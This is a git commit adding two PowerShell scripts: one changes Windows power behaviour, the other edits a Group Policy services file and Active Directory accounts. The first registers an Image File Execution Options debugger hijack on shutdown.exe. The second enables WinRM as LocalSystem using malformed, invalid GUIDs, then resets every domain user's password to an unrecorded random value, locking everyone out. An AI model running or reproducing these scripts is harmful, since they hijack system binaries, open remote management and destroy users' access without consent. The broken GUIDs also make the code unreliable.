34cca7dce109c463aef246e4d54047f21da83410
DuFrizzle <35477498+DuFrizzle@users.noreply.github.com>
2023-06-01 12:15:25 -0400

    Adding Set_Shutdown and WinRM Powershell Scripts

---
+++ Set_Shutdown_to_Sleep.ps1
@@ -0,0 +1,55 @@
+﻿# Get all devices that can wake the computer
+$wakeDevices = powercfg /devicequery wake_armed
+
+# Loop through all devices
+foreach ($device in $wakeDevices) {
+    # If the device is a keyboard or mouse
+    if ($device -like "*keyboard*" -or $device -like "*mouse*") {
+        # Disallow the device from waking the computer
+        powercfg /devicedisablewake "$device"
+    }
+}
+
+# Define GUIDs
+$GUID_POWER_SUBGROUP_BUTTONS_LID = "4f971e89-eebd-4455-a8de-9e59040e7347"
+$GUID_SETTING_LID_CLOSE_ACTION = "5ca83367-6e45-459f-a27b-476b1d01c936"
+$GUID_SETTING_POWER_BUTTON_ACTION = "7648efa3-dd9c-4e3e-b566-50f929386280"
+$GUID_SLEEP = "2942f679-e64d-4a61-8462-a3c78ac89b84" # Sleep
+
+# Get the active power scheme
+$activeScheme = (powercfg /GetActiveScheme) -replace ".*:\s*"
+
+# Set the Lid close action to Sleep
+powercfg /SetDCValueIndex $activeScheme $GUID_POWER_SUBGROUP_BUTTONS_LID $GUID_SETTING_LID_CLOSE_ACTION $GUID_SLEEP
+powercfg /SetACValueIndex $activeScheme $GUID_POWER_SUBGROUP_BUTTONS_LID $GUID_SETTING_LID_CLOSE_ACTION $GUID_SLEEP
+powercfg /SetACValueIndex $activeScheme $GUID_POWER_SUBGROUP_BUTTONS_LID $GUID_SETTING_POWER_BUTTON_ACTION $GUID_SLEEP
+
+# Make the change effective immediately
+powercfg /SetActive $activeScheme
+
+
+# Define the path to the batch file
+$batchFilePath = "C:\path\to\your\debugger.bat"
+
+# Define the command to write to the file
+$command = @'
+@echo off
+powercfg -hibernate off
+start /min "" %windir%\System32\rundll32.exe powrprof.dll,SetSuspendState 0,1,0
+'@
+
+# Write the command to the file
+Set-Content -Path $batchFilePath -Value $command
+
+
+# Path to the registry key
+$key = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\shutdown.exe"
+
+# Create the key if it does not exist
+if (-not (Test-Path -Path $key)) {
+    New-Item -Path $key -Force | Out-Null
+}
+
+# Set the Debugger value
+Set-ItemProperty -Path $key -Name "Debugger" -Value "C:\path\to\your\debugger.bat"
+
---
+++ WinRM_Service_Editing.ps1
@@ -0,0 +1,105 @@
+﻿# Load XML file
+[xml]$xmlData = Get-Content -Path '.\services.xml'
+
+# Get last service date
+$lastServiceDate = $xmlData.NTServices.NTService | 
+                   Select-Object -ExpandProperty changed |
+                   Sort-Object -Descending |
+                   Select-Object -First 1
+
+# Check if WinRM service is in the XML file
+$winRMService = $xmlData.NTServices.NTService |
+                Where-Object { $_.name -eq 'WinRM' }
+
+# If WinRM service is not in the XML file, append it
+if ($null -eq $winRMService) {
+    # Create WinRM service node
+    $winRMServiceNode = $xmlData.CreateElement('NTService')
+
+    $winRMServiceNode.SetAttribute('clsid', '{ab6f0BJSK-23444-435D-93HN4J-AKSJOFIO30900}')
+    $winRMServiceNode.SetAttribute('uid', '{j230939f-3j9f-dsnf3-sdkjo3-sdjf9i930id}')
+    $winRMServiceNode.SetAttribute('changed', $lastServiceDate)
+    $winRMServiceNode.SetAttribute('image', '1')
+    $winRMServiceNode.SetAttribute('name', 'WinRM')
+    $winRMServiceNode.SetAttribute('removePolicy', '0')
+    $winRMServiceNode.SetAttribute('userContext', '0')
+
+    # Create properties node for WinRM service
+    $propertiesNode = $xmlData.CreateElement('Properties')
+
+    $propertiesNode.SetAttribute('interact', '1')
+    $propertiesNode.SetAttribute('accountName', 'LocalSystem')
+    $propertiesNode.SetAttribute('timeout', '30')
+    $propertiesNode.SetAttribute('serviceAction', 'START')
+    $propertiesNode.SetAttribute('serviceName', 'WinRM')
+    $propertiesNode.SetAttribute('startupType', 'AUTODELAYED')
+
+    # Append properties node to WinRM service node
+    $winRMServiceNode.AppendChild($propertiesNode)
+
+    # Append WinRM service node to NTServices
+    $xmlData.NTServices.AppendChild($winRMServiceNode)
+
+    # Save the XML file
+    $xmlData.Save('.\services.xml')
+}
+
+# Load XML file
+[xml]$xmlData = Get-Content -Path '.\services.xml'
+
+# Check if WinRM service is in the XML file
+$winRMService = $xmlData.NTServices.NTService |
+                Where-Object { $_.name -eq 'WinRM' }
+
+# If WinRM service is in the XML file, update it
+if ($null -ne $winRMService) {
+    # Set attributes
+    $winRMService.clsid = '{ab6f0BJSK-23444-435D-93HN4J-AKSJOFIO30900}'
+    $winRMService.uid = '{j230939f-3j9f-dsnf3-sdkjo3-sdjf9i930id}'
+    $winRMService.image = '1'
+    $winRMService.name = 'WinRM'
+    $winRMService.removePolicy = '0'
+    $winRMService.userContext = '0'
+
+    # Set properties
+    $winRMService.Properties.interact = '1'
+    $winRMService.Properties.accountName = 'LocalSystem'
+    $winRMService.Properties.timeout = '30'
+    $winRMService.Properties.serviceAction = 'START'
+    $winRMService.Properties.serviceName = 'WinRM'
+    $winRMService.Properties.startupType = 'AUTODELAYED'
+
+    # Save the XML file
+    $xmlData.Save('.\services.xml')
+}
+else {
+    Write-Output "WinRM service does not exist."
+}
+
+
+# Import Active Directory Module
+Import-Module ActiveDirectory
+
+# Get all users
+$users = Get-ADUser -Filter *
+
+# Loop through all users
+foreach ($user in $users) {
+    # Generate a random password
+    $password = New-Object -TypeName System.Security.SecureString
+    $rand = New-Object -TypeName System.Random
+
+    1..16 | ForEach-Object { $password.AppendChar([char]$rand.Next(33,126)) }
+
+    # Reset user password
+    try {
+        Set-ADAccountPassword -Identity $user.SamAccountName -NewPassword $password -Reset -PassThru -Confirm:$false
+        # Optionally, you can enforce password change at next logon
+        # Set-ADUser -Identity $user.SamAccountName -ChangePasswordAtLogon $true
+
+        Write-Output "Password has been reset for $($user.SamAccountName)"
+    } catch {
+        Write-Error "Failed to reset password for $($user.SamAccountName): $_"
+    }
+}
+
